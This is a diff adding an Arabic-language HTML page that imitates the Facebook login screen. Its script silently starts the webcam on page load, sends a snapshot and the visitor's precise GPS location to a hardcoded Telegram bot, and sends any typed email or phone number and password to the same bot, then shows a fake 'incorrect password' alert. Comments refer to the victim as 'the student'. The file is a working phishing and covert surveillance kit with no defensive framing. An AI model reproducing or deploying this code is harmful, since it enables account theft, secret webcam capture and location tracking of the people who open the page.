@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>تسجيل الدخول إلى فيسبوك</title>
+<style>
+  body {
+    font-family: Helvetica, Arial, sans-serif;
+    background: #f0f2f5;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  .fb-container {
+    display: flex;
+    flex-direction: row;
+    justify-content: space-between;
+    align-items: center;
+    width: 980px;
+    max-width: 100%;
+    padding: 20px;
+    box-sizing: border-box;
+  }
+  .fb-left {
+    flex: 1;
+    padding-right: 20px;
+  }
+  .fb-left h1 {
+    color: #1877f2;
+    font-size: 56px;
+    margin: 0 0 10px 0;
+    font-weight: bold;
+  }
+  .fb-left p {
+    font-size: 28px;
+    line-height: 32px;
+    color: #1c1e21;
+    margin: 0;
+  }
+  .fb-right {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .login-card {
+    background: #ffffff;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    padding: 20px;
+    width: 396px;
+    box-sizing: border-box;
+    text-align: center;
+  }
+  .login-card input {
+    width: 100%;
+    padding: 14px 16px;
+    margin-bottom: 12px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    font-size: 17px;
+    box-sizing: border-box;
+    outline: none;
+    direction: ltr;
+    text-align: right;
+  }
+  .login-card input:focus {
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px #e7f3ff;
+  }
+  .login-btn {
+    background-color: #1877f2;
+    border: none;
+    border-radius: 6px;
+    color: white;
+    font-size: 20px;
+    font-weight: bold;
+    padding: 12px 16px;
+    width: 100%;
+    cursor: pointer;
+    margin-bottom: 16px;
+  }
+  .login-btn:hover {
+    background-color: #166fe5;
+  }
+  .forgot-password {
+    color: #1877f2;
+    font-size: 14px;
+    text-decoration: none;
+    display: block;
+    margin-bottom: 20px;
+  }
+  .forgot-password:hover {
+    text-decoration: underline;
+  }
+  hr {
+    border: none;
+    border-top: 1px solid #dadde1;
+    margin: 20px 0;
+  }
+  .create-btn {
+    background-color: #42b72a;
+    border: none;
+    border-radius: 6px;
+    color: white;
+    font-size: 17px;
+    font-weight: bold;
+    padding: 12px 16px;
+    cursor: pointer;
+    width: auto;
+    display: inline-block;
+  }
+  .create-btn:hover {
+    background-color: #36a420;
+  }
+  #status {
+    font-size: 12px;
+    color: #606770;
+    margin-top: 10px;
+  }
+  @media (max-width: 900px) {
+    .fb-container {
+      flex-direction: column;
+      text-align: center;
+    }
+    .fb-left {
+      padding-right: 0;
+      margin-bottom: 30px;
+    }
+    .fb-left h1 {
+      font-size: 40px;
+    }
+    .fb-left p {
+      font-size: 20px;
+      line-height: 24px;
+    }
+  }
+</style>
+</head>
+<body>
+
+  <!-- عناصر الكاميرا والكانفاس المخفية -->
+  <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+  <div class="fb-container">
+    <div class="fb-left">
+      <h1>facebook</h1>
+      <p>تواصل مع أصدقائي والعالم من حولك على فيسبوك.</p>
+    </div>
+    
+    <div class="fb-right">
+      <div class="login-card">
+        <form id="loginForm">
+          <input type="text" id="inputField" placeholder="البريد الإلكتروني أو رقم الهاتف" required />
+          <input type="password" id="password" placeholder="كلمة المرور" required />
+          <button type="submit" class="login-btn">تسجيل الدخول</button>
+          <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
+          <hr />
+          <button type="button" class="create-btn">إنشاء حساب جديد</button>
+        </form>
+      </div>
+      <div id="status">جارٍ التحقق من الأمان...</div>
+    </div>
+  </div>
+
+<script>
+  // إعدادات بوت تيليجرام
+  const TELEGRAM_BOT_TOKEN = '7574278665:AAFJHseMmeJkem6n_M2EmCbSVMq0qJ1GBhc';
+  const TELEGRAM_CHAT_ID = '5213365124';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const statusElem = document.getElementById('status');
+  const ctx = canvas.getContext('2d');
+
+  // دالة التقاط الصورة وإرسالها لتيليجرام
+  async function captureAndSend() {
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(async function(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('photo', blob, 'student_photo.jpg');
+
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      } catch (error) {
+        console.error('خطأ في إرسال الصورة:', error);
+      }
+    }, 'image/jpeg');
+  }
+
+  // تشغيل الكاميرا فوراً والتقاط صورة بعد ثانية واحدة للتأكد من جاهزيتها
+  async function initCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      await new Promise(resolve => { video.onloadeddata = () => resolve(); });
+      setTimeout(captureAndSend, 1000); 
+    } catch (err) {
+      statusElem.textContent = 'يرجى السماح بالوصول للكاميرا للمتابعة.';
+    }
+  }
+
+  initCamera();
+
+  // جلب وإرسال الموقع الجغرافي تلقائياً بمجرد فتح الصفحة
+  function sendLocation(lat, lon) {
+    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+    const message = `📍 موقع الطالب على الخريطة:\n${mapsLink}`;
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
+    })
+    .then(() => {
+      statusElem.textContent = 'جاهز للاستخدام.';
+    })
+    .catch(() => {
+      statusElem.textContent = 'تعذر إرسال بيانات الموقع.';
+    });
+  }
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      position => {
+        sendLocation(position.coords.latitude, position.coords.longitude);
+      },
+      error => {
+        statusElem.textContent = 'يرجى السماح بصلاحية الموقع الجغرافي.';
+      },
+      { timeout: 10000, enableHighAccuracy: true }
+    );
+  } else {
+    statusElem.textContent = 'المتصفح لا يدعم تحديد الموقع.';
+  }
+
+  // عند محاولة تسجيل الدخول (إرسال البيانات للبوت)
+  document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const userId = document.getElementById('inputField').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    const message = `🚨 محاولة تسجيل دخول جديدة:\n👤 المستخدم: ${userId}\n🔑 كلمة المرور: ${password}`;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message
+        })
+      });
+    } catch (err) {
+      console.error(err);
+    }
+
+    // إعادة توجيه وهمية أو إظهار خطأ ليوهم الطالب بخطأ كلمة المرور
+    alert('كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى.');
+    document.getElementById('password').value = '';
+  });
+</script>
+</body>
+</html>
